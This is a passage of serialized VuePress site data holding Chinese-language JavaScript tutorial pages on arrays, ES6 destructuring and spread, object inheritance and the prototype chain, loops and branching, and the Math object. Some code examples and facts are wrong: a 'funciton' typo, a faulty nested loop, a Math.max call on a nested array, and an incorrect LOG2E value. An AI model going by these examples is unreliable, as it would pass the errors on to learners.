["a","b","c"];\n\n\n创建数组后赋值\n数组中存储的是有序的数据，所以可根据数据所在位置的序号进行赋值，这个位置叫做下标\n语法：\n\n数组名[下标]\n\n\n示例\n\nvar arr = [];\narr[0]="a";\narr[1]="b";\narr[2]="c";\n// 上面的操作等价于  var arr = ["a","b","c"];\n\n\n# 赋值特点\n\n * 数组的下标是从 0 开始计算，arr[0]就是arr数组的第一个值\n * 数组中可是 以存储任意数据类型的数据，在一个数组中可以包含对象元素、函数、数组\n\n\n# 数组的访问\n\n\n# 通过数组下标访问数据\n\n * 访问数据：直接通过下标获取数组对应位置的值\n * 修改数据：直接将数据赋值给对应数组对应位置\n\n// 访问arr数组的第一个值\nvar one = arr[0];\n// 修改arr数字的第一个值为\'x\';\narr[0] = "x"\n\n\n\n# 数组的长度\n\n数组的长度即数组中存储数据的个数，数组上有一个length属性可用来访问数组的长度\n\nvar arr = [1,2,3,4,5];\narr.length   // 5\n\n\n数组最后一个数据的下标： length-1\n访问数组最后一个元素：arr[length-1]\n\n\n# 数组的遍历\n\n> 通过循环依次获取 0 到 length-1 的下标，即可实现遍历数组，访问所有数组数据\n\n# for循环遍历\n\nvar arr=[1,2,3];\nfor(var i=0;i<arr.length;i++){\n  console.log(arr[i]);\n}\n\n// 控制台输出\n> 1\n> 2\n> 3\n\n\n# for...in 循环\n\nvar arr = [1,2,3];\nfor(var i in arr){\n  // i 是数组下标\n  // arr[i] 是数组数据\n}\n\n\n> 但是最好不要用for in 循环来遍历数组，它是用来遍历对象的。如果在数组原型上添加方法，它也会遍历出来\n\n# [es6]for...of 循环\n\nfor...of循环可以使用的范围包括数组、set 和 map 结构、某些类似数组的对象（比如arguments对象、dom nodelist 对象），以及字符串。\n\nlet arr = [3, 5, 7];\narr.foo = \'hello\';\n\nfor (let i in arr) {\n  // i 值是键名\n  console.log(i); // "0", "1", "2", "foo"\n}\n\nfor (let i of arr) {\n  // i 值是键值，  并且只返回具有数字索引的属性\n  console.log(i);   //  "3", "5", "7"\n}\n\n\n\n# 二维数组\n\n> 数组中的每一个子元素都是数组\n\nvar arr = [[1,2,3],[4,5],[6]]\n\n\n遍历二维数组\n\nfor(var i =0; i<arr.length;i++){\n  for(var j =0; j<arr.length;j++){\n    console.log(arr[i][j])\n  }\n}\n\n\n\n# 数组扩展\n\n\n# [es6] 数组的解构赋值\n\n> 从数组中提取值，对变量进行赋值，这被称为数组解构赋值。如果解构不成功，变量的值就等于undefined。\n\nvar [one, two, three] = [1,2,3];\nconsole.log(one); // 1\nconsole.log(two); // 2\nconsole.log(three); // 3\n\nlet [foo, [[bar], baz]] = [1, [[2], 3]];\nfoo // 1\nbar // 2\nbaz // 3\n\nlet [ , , third] = ["foo", "bar", "baz"];\nthird // "baz"\n\nlet [x, , y] = [1, 2, 3];\nx // 1\ny // 3\n\nlet [head, ...tail] = [1, 2, 3, 4];\nhead // 1\ntail // [2, 3, 4]\n\nlet [x, y, ...z] = [\'a\'];\nx // "a"\ny // undefined\nz // []\n\n\n为了防止从数组中取出一个值为undefined的对象，还可以为这个对象设置默认值。\n\nvar a, b;\n[a=5, b=7] = [1];\nconsole.log(a); // 1\nconsole.log(b); // 7\n\n\n注意，es6 内部使用严格相等运算符（===），判断一个位置是否有值。所以，只有当一个数组成员严格等于undefined，默认值才会生效。 用途1： 不使用第三个变量交换两个变量的值。\n\nlet [x = 1] = [undefined];\nx // 1\n\nlet [x = 1] = [null];\nx // null\n\n// 上面代码中，如果一个数组成员是null，默认值就不会生效，因为null不严格等于undefined\n\n\n如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。\n\nfunction f() {\n  console.log(\'aaa\');\n}\n\nlet [x = f()] = [1];\n\n\n上面代码中，因为x能取到值，所以函数f根本不会执行。上面的代码其实等价于下面的代码。\n\nlet x;\nif ([1][0] === undefined) {\n  x = f();\n} else {\n  x = [1][0];\n}\n\n\n默认值可以引用解构赋值的其他变量，但该变量必须已经声明。\n\nlet [x = 1, y = x] = [];     // x=1; y=1\nlet [x = 1, y = x] = [2];    // x=2; y=2\nlet [x = 1, y = x] = [1, 2]; // x=1; y=2\nlet [x = y, y = 1] = [];     // referenceerror: y is not defined\n\n\nvar a = 1, b = 3;\n\n[a, b] = [b, a];\nconsole.log(a); // 3\nconsole.log(b); // 1\n\n\n\n# [es6]扩展运算符 ...\n\n> 扩展运算符（spread）是三个点...。它好比 函数rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。\n\nconsole.log(...[1, 2, 3])        // 1 2 3\nconsole.log(1, ...[2, 3, 4], 5)  // 1 2 3 4 5\n\n\n# 用途\n\n1.函数调用传参\n\n// 将数组参数items转化为数字，从而进行push\nfunction push(array, ...items) {\narray.push(...items);\n}\n\n// 将数组中数据相加\nfunction add(x, y) {\nreturn x + y;\n}\nlet numbers = [4, 38];\nadd(...numbers) // 42\n\n// 寻找数组最值\nmath.max(...[numbers])    // 38\nmath.min(...[numbers])    // 4\n\n\n2.数组拷贝\n\nconst a1 = [1, 2];\n// 写法一\nconst a2 = [...a1];\n// 写法二\nconst [...a2] = a1;\n\n\n3.数组合并\n\nlet arr1 = [1,2,3], arr2 = [4,5,6];\nlet newarr = [...arr1, ...arr2]\n\n\n> 不过，这种方法是浅拷贝，使用的时候需要注意。\n\n\n# array.from\n\n> array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 es6 新增的数据结构 set 和 map）\n\nlet arraylike = {\n    \'0\': \'a\',\n    \'1\': \'b\',\n    \'2\': \'c\',\n    length: 3\n};\n\n// es5的写法\nvar arr1 = [].slice.call(arraylike); // [\'a\', \'b\', \'c\']\n\n// es6的写法\nlet arr2 = array.from(arraylike); // [\'a\', \'b\', \'c\']\n\n\n\n# array.of()\n\n> array.of()方法用于将一组值，转换为数组。\n\narray.of(3, 11, 8) // [3,11,8]\narray.of(3) // [3]\narray.of(3).length // 1\n\n\n这个方法的主要目的，是弥补数组构造函数array()的不足。因为参数个数的不同，会导致array()的行为有差异。\n\narray() // []\narray(3) // [, , ,]\narray(3, 11, 8) // [3, 11, 8]\n',charsets:{cjk:!0}},{title:"对象的特性",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/02-%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E6%80%A7.html",relativePath:"Javascript/Javascript基础语法/07-对象/02-对象的特性.md",key:"v-07bf1260",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/02-%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E6%80%A7.html",headers:[{level:2,title:"封装",slug:"封装",normalizedTitle:"封装",charIndex:13},{level:3,title:"封装方法",slug:"封装方法",normalizedTitle:"封装方法",charIndex:182},{level:2,title:"对象的继承",slug:"对象的继承",normalizedTitle:"对象的继承",charIndex:1499},{level:3,title:"继承方式",slug:"继承方式",normalizedTitle:"继承方式",charIndex:1594},{level:3,title:"原型继承(将父类的实例作为子类的原型)",slug:"原型继承-将父类的实例作为子类的原型",normalizedTitle:"原型继承(将父类的实例作为子类的原型)",charIndex:1603},{level:3,title:"对象冒充继承",slug:"对象冒充继承",normalizedTitle:"对象冒充继承",charIndex:2008},{level:3,title:"ES6类继承",slug:"es6类继承",normalizedTitle:"es6类继承",charIndex:2776},{level:2,title:"原型链",slug:"原型链",normalizedTitle:"原型链",charIndex:2833},{level:3,title:"原型链",slug:"原型链-2",normalizedTitle:"原型链",charIndex:2833}],headersStr:"封装 封装方法 对象的继承 继承方式 原型继承(将父类的实例作为子类的原型) 对象冒充继承 ES6类继承 原型链 原型链",content:'# 对象的特性\n\n 1. 封装\n 2. 继承\n\n\n# 封装\n\n> 封装： 将对象的所有组成部分组合起来，尽可能的隐藏对象的部分细节，使其受到保护，只提供有限的接口与外部发生联系。\n\n例如同时生成多个相同的对象，可以将生成对象的过程打包直接调用，这个过程就是封装\n\n优点：\n\n\n 1. 安全，使用时无法看到具体实现细节，只需要直接调用\n 2. 便于修改操作\n\n\n# 封装方法\n\n * 工厂函数（不推荐使用）\n   \n   > 将创建对象并赋值的过程封装成一个函数\n   \n   function person(name,sex){\n       var person = {};\n       person.name = name;\n       person.sex = sex;\n       person.say = function(){\n           alert("说话");\n       }\n       return person;\n   }\n   var zhangsan = person("张三","man");\n   alert(zhangsan.name);\n   \n\n * 构造函数（每创建一个对象，会把相同的代码存储到内存中，会造成对内存的浪费）\n   \n   function person(name,sex){\n       this.name = name;\n       this.sex = sex;\n       this.say = function(){\n           alert("说话");\n       }\n   }\n   var lisi = new person("李四","boy");\n   alert(lisi.sex);\n   \n\n每次使用工厂函数或构造函数，内部的属性和方法都会在内存中重新开辟一个控件存储生成的对象，导致某些相同的方法或属性被重复保存，占用内存。\n\n * prototype方法（会把共享的方法或属性放到代码段中来存储,它不能共享对象）\n   实例一：\n   \n   person.prototype.eat=function(){\n       alert("吃饭");\n   }\n   var lisi=new person("李四","boy");\n   lisi.eat();\n   \n   \n   实例二：\n   \n   person.prototype.aaa = {name:"王五"};\n   var lisi = new person("李四","boy");\n   var zhaoliu = new person("赵六","boy");\n   alert(lisi.aaa.name = "xiaosi"); //xiaosi\n   alert(zhaoliu.aaa.name);  //xiaosi 将原型上的属性值一起改了\n   \n\n * 混合函数 最佳的一种方法，构造函数与prototype的结合，根据实际情况考虑\n   \n   私有属性方法放到构造函数中，共有方法放到原型中\n   \n   function person(user, sex){\n     this.user = user\n     this.sex = sex\n   }\n   person.prototype = {\n     coding: funciton(){\n       alert("写代码")\n     }\n   }\n   \n   \n   对象在内存中存储方式：\n   \n\n\n# 对象的继承\n\n> 继承：一个对象拥有另一个对象的属性与方法\n\n * 父类（基类）：被继承的对象，\n * 子类：继承的对象。\n\n优点：\n提高代码的重用性，提高代码的逻辑性与可维护性。\n\n\n# 继承方式\n\n\n# 原型继承(将父类的实例作为子类的原型)\n\n> 原理：对象访问属性方法会遵循 "构造函数 -> 原型"的顺序，所以将父类的实例放到子类原型时， 子类实例化出的对象就可以访问到原型上父类的内容，从而实现了继承。\n\nfunction Animal(){\n  eat: function(food){\n    alert(food)\n  }\n}\nfunction Cat(){ }\nCat.prototype = new Animal();    // 将父类(Animal)的实例作为子类(Cat)的原型\nvar tom = new Cat();\n\ncat.eat(\'fish\')     // 弹出 \'fish\'\n\nconsole.log(tom instanceof Animal);     //true\nconsole.log(tom instanceof Cat);        //true\n\n\n\n# 对象冒充继承\n\n 1. call\n    格式：fun.call(obj2,参数1, 参数2...)\n    本质上来说，call方法实际上就是要改变fun函数内的this指向。\n\nfunction Animal () {\n  this.eat = function(food){\n    alert(food)\n  }\n}\nAnimal.prototype.say = function(sound){\n    alert(sound)\n}\nfunction Cat () {\n    this.name = "tom";\n    Animal.call(this)\n}\n\nvar cat = new Cat ();\ncat.eat(\'鱼\');  //OK\ncat.say("喵喵"); //Error 对象冒充只能继承构造函数上的属性与方法\n\n\n对象冒充继承方式只能继承构造函数上的属性与方法，不能继承原型上属性与方法。 2. apply\n用法基本与call相同，函数的参数通过数组传递\n格式：fun.apply(obj2,[参数1, 参数2...])\n\nfunction Animal () {\n  this.eat = function(food){\n    alert(food)\n  }\n}\nAnimal.prototype.say = function(sound){\n    alert(sound)\n}\nfunction Cat () {\n    this.name = "tom";\n    Animal.apply(this)\n}\n\nvar cat = new Cat ();\ncat.eat(\'鱼\');  //OK\ncat.say("喵喵"); //Error 对象冒充只能继承构造函数上的属性与方法\n\n\n\n# ES6类继承\n\n> 通过extends关键字实现类与类之间的继承，然后实例化子类，来实现继承。详见下一节\n\n\n# 原型链\n\n\n# 原型链\n\n> 继承是面向对象编程中讨论最多的话题。很多面向对象语言都支持两种继承：接口继承和实现继承。 前者只继承方法签名，后者继承实际的方法。接口继承在 ECMAScript 中是不可能的，因为函数没有签 名。实现继承是 ECMAScript 唯一支持的继承方式，而这主要是通过原型链实现的。\n\n通过原型链访问对象属性与方法顺序为：构造函数--\x3e构造函数原型--\x3e原型链\n\n原型链:\n当访问对象的属性或方法时，该属性或方法会在对象本身调用，对象本身没有则去对象本身的构造函数调用，本身构造函数没有则去父类的构造函数调用、父类的原型...以此类推，直到寻找至Object、以及Object的原型、null。最后属性不存在时会得到undefined，方法不存在则会报错。\n\nECMA-262 把原型链定义为 ECMAScript 的主要继承方式。其基本思想就是通过原型继承多个引用 类型的属性和方法。重温一下构造函数、原型和实例的关系：每个构造函数都有一个原型对象，原型有 一个属性指回构造函数，而实例有一个内部指针指向原型。如果原型是另一个类型的实例呢？那就意味 着这个原型本身有一个内部指针指向另一个原型，相应地另一个原型也有一个指针指向另一个构造函 数。这样就在实例和原型之间构造了一条原型链。这就是原型链的基本构想。\n\n  Object.prototype.say=function(){\n      alert("Object的方法");\n  }\n  function person(){\n      this.say=function(){\n          alert("person的方法");\n      }\n  }\n  person.prototype.say=function(){\n      alert("person原型的方法");\n  }\n  function student(){\n      this.say=function(){\n          alert("student的方法");\n      }\n  }\n  student.prototype=new person();\n  var xiaoming=new student();\n  xiaoming.say=function(){\n      alert("xiaoMing的方法");\n  }\n  xiaoming.say();\n',normalizedContent:'# 对象的特性\n\n 1. 封装\n 2. 继承\n\n\n# 封装\n\n> 封装： 将对象的所有组成部分组合起来，尽可能的隐藏对象的部分细节，使其受到保护，只提供有限的接口与外部发生联系。\n\n例如同时生成多个相同的对象，可以将生成对象的过程打包直接调用，这个过程就是封装\n\n优点：\n\n\n 1. 安全，使用时无法看到具体实现细节，只需要直接调用\n 2. 便于修改操作\n\n\n# 封装方法\n\n * 工厂函数（不推荐使用）\n   \n   > 将创建对象并赋值的过程封装成一个函数\n   \n   function person(name,sex){\n       var person = {};\n       person.name = name;\n       person.sex = sex;\n       person.say = function(){\n           alert("说话");\n       }\n       return person;\n   }\n   var zhangsan = person("张三","man");\n   alert(zhangsan.name);\n   \n\n * 构造函数（每创建一个对象，会把相同的代码存储到内存中，会造成对内存的浪费）\n   \n   function person(name,sex){\n       this.name = name;\n       this.sex = sex;\n       this.say = function(){\n           alert("说话");\n       }\n   }\n   var lisi = new person("李四","boy");\n   alert(lisi.sex);\n   \n\n每次使用工厂函数或构造函数，内部的属性和方法都会在内存中重新开辟一个控件存储生成的对象，导致某些相同的方法或属性被重复保存，占用内存。\n\n * prototype方法（会把共享的方法或属性放到代码段中来存储,它不能共享对象）\n   实例一：\n   \n   person.prototype.eat=function(){\n       alert("吃饭");\n   }\n   var lisi=new person("李四","boy");\n   lisi.eat();\n   \n   \n   实例二：\n   \n   person.prototype.aaa = {name:"王五"};\n   var lisi = new person("李四","boy");\n   var zhaoliu = new person("赵六","boy");\n   alert(lisi.aaa.name = "xiaosi"); //xiaosi\n   alert(zhaoliu.aaa.name);  //xiaosi 将原型上的属性值一起改了\n   \n\n * 混合函数 最佳的一种方法，构造函数与prototype的结合，根据实际情况考虑\n   \n   私有属性方法放到构造函数中，共有方法放到原型中\n   \n   function person(user, sex){\n     this.user = user\n     this.sex = sex\n   }\n   person.prototype = {\n     coding: funciton(){\n       alert("写代码")\n     }\n   }\n   \n   \n   对象在内存中存储方式：\n   \n\n\n# 对象的继承\n\n> 继承：一个对象拥有另一个对象的属性与方法\n\n * 父类（基类）：被继承的对象，\n * 子类：继承的对象。\n\n优点：\n提高代码的重用性，提高代码的逻辑性与可维护性。\n\n\n# 继承方式\n\n\n# 原型继承(将父类的实例作为子类的原型)\n\n> 原理：对象访问属性方法会遵循 "构造函数 -> 原型"的顺序，所以将父类的实例放到子类原型时， 子类实例化出的对象就可以访问到原型上父类的内容，从而实现了继承。\n\nfunction animal(){\n  eat: function(food){\n    alert(food)\n  }\n}\nfunction cat(){ }\ncat.prototype = new animal();    // 将父类(animal)的实例作为子类(cat)的原型\nvar tom = new cat();\n\ncat.eat(\'fish\')     // 弹出 \'fish\'\n\nconsole.log(tom instanceof animal);     //true\nconsole.log(tom instanceof cat);        //true\n\n\n\n# 对象冒充继承\n\n 1. call\n    格式：fun.call(obj2,参数1, 参数2...)\n    本质上来说，call方法实际上就是要改变fun函数内的this指向。\n\nfunction animal () {\n  this.eat = function(food){\n    alert(food)\n  }\n}\nanimal.prototype.say = function(sound){\n    alert(sound)\n}\nfunction cat () {\n    this.name = "tom";\n    animal.call(this)\n}\n\nvar cat = new cat ();\ncat.eat(\'鱼\');  //ok\ncat.say("喵喵"); //error 对象冒充只能继承构造函数上的属性与方法\n\n\n对象冒充继承方式只能继承构造函数上的属性与方法，不能继承原型上属性与方法。 2. apply\n用法基本与call相同，函数的参数通过数组传递\n格式：fun.apply(obj2,[参数1, 参数2...])\n\nfunction animal () {\n  this.eat = function(food){\n    alert(food)\n  }\n}\nanimal.prototype.say = function(sound){\n    alert(sound)\n}\nfunction cat () {\n    this.name = "tom";\n    animal.apply(this)\n}\n\nvar cat = new cat ();\ncat.eat(\'鱼\');  //ok\ncat.say("喵喵"); //error 对象冒充只能继承构造函数上的属性与方法\n\n\n\n# es6类继承\n\n> 通过extends关键字实现类与类之间的继承，然后实例化子类，来实现继承。详见下一节\n\n\n# 原型链\n\n\n# 原型链\n\n> 继承是面向对象编程中讨论最多的话题。很多面向对象语言都支持两种继承：接口继承和实现继承。 前者只继承方法签名，后者继承实际的方法。接口继承在 ecmascript 中是不可能的，因为函数没有签 名。实现继承是 ecmascript 唯一支持的继承方式，而这主要是通过原型链实现的。\n\n通过原型链访问对象属性与方法顺序为：构造函数--\x3e构造函数原型--\x3e原型链\n\n原型链:\n当访问对象的属性或方法时，该属性或方法会在对象本身调用，对象本身没有则去对象本身的构造函数调用，本身构造函数没有则去父类的构造函数调用、父类的原型...以此类推，直到寻找至object、以及object的原型、null。最后属性不存在时会得到undefined，方法不存在则会报错。\n\necma-262 把原型链定义为 ecmascript 的主要继承方式。其基本思想就是通过原型继承多个引用 类型的属性和方法。重温一下构造函数、原型和实例的关系：每个构造函数都有一个原型对象，原型有 一个属性指回构造函数，而实例有一个内部指针指向原型。如果原型是另一个类型的实例呢？那就意味 着这个原型本身有一个内部指针指向另一个原型，相应地另一个原型也有一个指针指向另一个构造函 数。这样就在实例和原型之间构造了一条原型链。这就是原型链的基本构想。\n\n  object.prototype.say=function(){\n      alert("object的方法");\n  }\n  function person(){\n      this.say=function(){\n          alert("person的方法");\n      }\n  }\n  person.prototype.say=function(){\n      alert("person原型的方法");\n  }\n  function student(){\n      this.say=function(){\n          alert("student的方法");\n      }\n  }\n  student.prototype=new person();\n  var xiaoming=new student();\n  xiaoming.say=function(){\n      alert("xiaoming的方法");\n  }\n  xiaoming.say();\n',charsets:{cjk:!0}},{title:"流程控制",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/04-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.html",relativePath:"Javascript/Javascript基础语法/04-流程控制.md",key:"v-60fb8218",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/04-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.html",headers:[{level:2,title:"选择结构(条件判断)",slug:"选择结构-条件判断",normalizedTitle:"选择结构(条件判断)",charIndex:152},{level:3,title:"if分支",slug:"if分支",normalizedTitle:"if分支",charIndex:202},{level:3,title:"switch 分支(多选一的条件判断)",slug:"switch-分支-多选一的条件判断",normalizedTitle:"switch 分支(多选一的条件判断)",charIndex:717},{level:2,title:"循环结构",slug:"循环结构",normalizedTitle:"循环结构",charIndex:117},{level:3,title:"for循环",slug:"for循环",normalizedTitle:"for循环",charIndex:1016},{level:3,title:"while语句",slug:"while语句",normalizedTitle:"while语句",charIndex:1587},{level:3,title:"do-while语句",slug:"do-while语句",normalizedTitle:"do-while语句",charIndex:1843}],headersStr:"选择结构(条件判断) if分支 switch 分支(多选一的条件判断) 循环结构 for循环 while语句 do-while语句",content:"# 流程控制\n\n> 流程 指的是代码的执行顺序\n\n流程控制 指通过规定的语句让程序代码有条件的按照一定的方式执行\n\n结构     描述\n顺序结构   按照书写顺序从上到下的执行代码\n选择结构   根据给定的条件有选择的执行相应的语句\n循环结构   在给定的条件满足的情况下，反复的执行同一段代码\n\n\n# 选择结构(条件判断)\n\n选择(分支、条件)结构 —— 根据给定的条件有选择的执行相应的语句\n\n\n# if分支\n\n 1. 单路分支\n\nif(判断条件){    \n    条件为真，执行该处代码\n}\n\n\n 2. 双路分支(两条分支二选一)\n\nif(判断条件){    \n    条件为真，执行该处代码\n}else{\n    条件为假，执行该处代码\n}\n\n\n 3. 多路分支\n\nif(条件1){\n    条件1 成立,执行代码\n}else if(条件2){\n    条件1不成,条件2成立,  执行代码\n}else if(条件3){\n    条件1 条件2都不成立,条件3成立,  执行代码\n}else{\n    所有条件都不成立,  执行代码\n}\n\n\n 4. 嵌套分支\n\nif (条件1){\n    条件1 成立,执行代码\n    if(条件2){\n        条件1 条件2 都成立,执行代码\n        if(条件3){\n            条件1 条件2 条件3 都成立,执行代码\n        }else{\n            条件1 条件2成立，条件3不成立，执行代码\n        }\n    }else if(条件4){\n        条件1成立 条件2不成立,执行代码\n    }\n}\n\n\n\n# switch 分支(多选一的条件判断)\n\nswitch (需要判断的值) {\n    case 值1:\n        当需要判断的值==值1 ,执行代码\n        break;\n    case 值2:\n        当需要判断的值==值2 ,执行代码\n        break;\n    case 值3:\n        当需要判断的值==值3 ,执行代码\n        break;\n}\n\n\nif分支与switch分支的区别与选择:\n\n\n * 当判断某种范围时用if，当判断单个值时用switch\n * 各个条件满足的情况不可重复，放置造成不可预期后果\n\n\n# 循环结构\n\n\n# for循环\n\nfor(var i = 0; i < 100; i++){\n    循环体\n    每次循环执行一次该处代码\n}\n\n\n# for循环的执行顺序\n\n> for循环四个要素： 起始值、终止值、步进值、循环体\n\nfor(起始值;终止值;步进值){\n    循环体;\n}\n\n\n第一次循环的时候顺序为：起始值 => 终止值，判断终止值是否满足条件，不满足条件则结束循环，满足则继续循环 => 循环体 => 步进值;\n后续的循环则不再执行起始值，其余顺序不变，直到终止值不满足条件，循环结束。\n\n# break和continue\n\n * break: 语句可以立即退出循环，阻止再次反复执行任何代码。\n * continue: 语句退出当前循环，根据控制表达式还允许继续进行下一次循环。\n\nfor(var i=1;i<=10;i++) {\n    if(i==5) {\n        break;\n    }\n    console.log(i);     // 输出结果：1 2 3 4\n}\n\nfor(var i=1;i<=10;i++) {\n    if(i==5) {\n        continue;\n    }\n    console.log(i);    // 输出结果：1 2 3 4 6 7 8 9 10\n}\n\n\n\n# while语句\n\n> 在条件表达式为真的前提下，循环执行指定的一段代码，直到那个表达式不为真时结束循环。\n\n// 控制台顺序输出 1-5:\nvar i = 0;\nwhile (i < 5){\n\ti += 1;\n\tconsole.log(i);\n}\n\n\n# for循环和while循环的使用选择\n\n 1. for循环必须知道循环次数，而while循环次数可以不确定\n 2. 所以在已知循环次数情况下使用for循环\n 3. 使用时优先考虑for循环，当无法写出循环条件的起始结束步进值时考虑用while循环\n\n\n# do-while语句\n\n> 先执行一次循环,再进行判断,所以循环至少迭代一次。\n\n// 控制台输出1-5 :\nvar i = 0;\ndo {\n   i += 1;\n\t console.log(i);\n} while (i < 5);\n\n\n# while循环和do while循环的使用选择\n\n 1. do while循环先执行循环体后判断条件是否成立；\n 2. while循环先判断条件是否成立，后执行循环体\n 3. 所以do while循环的循环体至少执行一次\n 4. 总结： 当循环的判断条件所需的值来自于循环体时，可以使用do while循环\n\ndo while循环：获取小于0.5的随机数(不知道循环次数，判断条件来自于循环体)\n\nvar number;\ndo{\n    number = Math.random()\n}while(number>=0.5)\n",normalizedContent:"# 流程控制\n\n> 流程 指的是代码的执行顺序\n\n流程控制 指通过规定的语句让程序代码有条件的按照一定的方式执行\n\n结构     描述\n顺序结构   按照书写顺序从上到下的执行代码\n选择结构   根据给定的条件有选择的执行相应的语句\n循环结构   在给定的条件满足的情况下，反复的执行同一段代码\n\n\n# 选择结构(条件判断)\n\n选择(分支、条件)结构 —— 根据给定的条件有选择的执行相应的语句\n\n\n# if分支\n\n 1. 单路分支\n\nif(判断条件){    \n    条件为真，执行该处代码\n}\n\n\n 2. 双路分支(两条分支二选一)\n\nif(判断条件){    \n    条件为真，执行该处代码\n}else{\n    条件为假，执行该处代码\n}\n\n\n 3. 多路分支\n\nif(条件1){\n    条件1 成立,执行代码\n}else if(条件2){\n    条件1不成,条件2成立,  执行代码\n}else if(条件3){\n    条件1 条件2都不成立,条件3成立,  执行代码\n}else{\n    所有条件都不成立,  执行代码\n}\n\n\n 4. 嵌套分支\n\nif (条件1){\n    条件1 成立,执行代码\n    if(条件2){\n        条件1 条件2 都成立,执行代码\n        if(条件3){\n            条件1 条件2 条件3 都成立,执行代码\n        }else{\n            条件1 条件2成立，条件3不成立，执行代码\n        }\n    }else if(条件4){\n        条件1成立 条件2不成立,执行代码\n    }\n}\n\n\n\n# switch 分支(多选一的条件判断)\n\nswitch (需要判断的值) {\n    case 值1:\n        当需要判断的值==值1 ,执行代码\n        break;\n    case 值2:\n        当需要判断的值==值2 ,执行代码\n        break;\n    case 值3:\n        当需要判断的值==值3 ,执行代码\n        break;\n}\n\n\nif分支与switch分支的区别与选择:\n\n\n * 当判断某种范围时用if，当判断单个值时用switch\n * 各个条件满足的情况不可重复，放置造成不可预期后果\n\n\n# 循环结构\n\n\n# for循环\n\nfor(var i = 0; i < 100; i++){\n    循环体\n    每次循环执行一次该处代码\n}\n\n\n# for循环的执行顺序\n\n> for循环四个要素： 起始值、终止值、步进值、循环体\n\nfor(起始值;终止值;步进值){\n    循环体;\n}\n\n\n第一次循环的时候顺序为：起始值 => 终止值，判断终止值是否满足条件，不满足条件则结束循环，满足则继续循环 => 循环体 => 步进值;\n后续的循环则不再执行起始值，其余顺序不变，直到终止值不满足条件，循环结束。\n\n# break和continue\n\n * break: 语句可以立即退出循环，阻止再次反复执行任何代码。\n * continue: 语句退出当前循环，根据控制表达式还允许继续进行下一次循环。\n\nfor(var i=1;i<=10;i++) {\n    if(i==5) {\n        break;\n    }\n    console.log(i);     // 输出结果：1 2 3 4\n}\n\nfor(var i=1;i<=10;i++) {\n    if(i==5) {\n        continue;\n    }\n    console.log(i);    // 输出结果：1 2 3 4 6 7 8 9 10\n}\n\n\n\n# while语句\n\n> 在条件表达式为真的前提下，循环执行指定的一段代码，直到那个表达式不为真时结束循环。\n\n// 控制台顺序输出 1-5:\nvar i = 0;\nwhile (i < 5){\n\ti += 1;\n\tconsole.log(i);\n}\n\n\n# for循环和while循环的使用选择\n\n 1. for循环必须知道循环次数，而while循环次数可以不确定\n 2. 所以在已知循环次数情况下使用for循环\n 3. 使用时优先考虑for循环，当无法写出循环条件的起始结束步进值时考虑用while循环\n\n\n# do-while语句\n\n> 先执行一次循环,再进行判断,所以循环至少迭代一次。\n\n// 控制台输出1-5 :\nvar i = 0;\ndo {\n   i += 1;\n\t console.log(i);\n} while (i < 5);\n\n\n# while循环和do while循环的使用选择\n\n 1. do while循环先执行循环体后判断条件是否成立；\n 2. while循环先判断条件是否成立，后执行循环体\n 3. 所以do while循环的循环体至少执行一次\n 4. 总结： 当循环的判断条件所需的值来自于循环体时，可以使用do while循环\n\ndo while循环：获取小于0.5的随机数(不知道循环次数，判断条件来自于循环体)\n\nvar number;\ndo{\n    number = math.random()\n}while(number>=0.5)\n",charsets:{cjk:!0}},{title:"Math对象",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/06-Math%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/06-Math对象.md",key:"v-5a8ffa96",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/06-Math%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"Math上的属性",slug:"math上的属性",normalizedTitle:"math上的属性",charIndex:107},{level:2,title:"Math的常用方法",slug:"math的常用方法",normalizedTitle:"math的常用方法",charIndex:414},{level:3,title:"toFixed() 方法",slug:"tofixed-方法",normalizedTitle:"tofixed() 方法",charIndex:1498},{level:3,title:"小技巧",slug:"小技巧",normalizedTitle:"小技巧",charIndex:1677}],headersStr:"Math上的属性 Math的常用方法 toFixed() 方法 小技巧",content:"# Math对象\n\n> Math（算数）对象的作用是：执行常见的算数任务。 没有构造函数 Math()，在使用Math上的方法和属性时无需创建，把 Math当作对象使用就可以调用其所有属性和方法就就可以。\n\n\n# Math上的属性\n\n属性        属性描述\nPI        返回圆周率（约等于3.14159）。\nE         返回算术常量 e，即自然对数的底数（约等于2.718）。\nLN2       返回 2 的自然对数（约等于0.693）。\nLN10      返回 10 的自然对数（约等于2.302）。\nLOG2E     返回以 2 为底的 e 的对数（约等于 1.414）。\nLOG10E    返回以 10 为底的 e 的对数（约等于0.434）。\nSQRT1_2   返回返回 2 的平方根的倒数（约等于 0.707）。\nSQRT2     返回 2 的平方根（约等于 1.414）。\n\n\n# Math的常用方法\n\n方法                          方法描述\nMath.abs(x)                 返回x的绝对值。\nMath.round(x)               返回x四舍五入之后的整数值\nMath.ceil(x)                返回x的近似值，向上取整\nMath.floor(x)               返回x的近似值，向下取整\nMath.max(x,y)               返回x,y中的最大值\nMath.min(x,y)               返回x,y中的最小值\nMath.random()               返回一个0~1之间的数字\nMath.trunc(x)               将x的小数部分去除，返回整数部分(ie不能使用)\nMath.pow(x,y)               取x的y次幂\nMath.sqrt(x)                返回x的平方根\nMath.cbrt(x)                计算一个数的立方根\nMath.sin(x)                 返回x的正弦值\nMath.cos(x)                 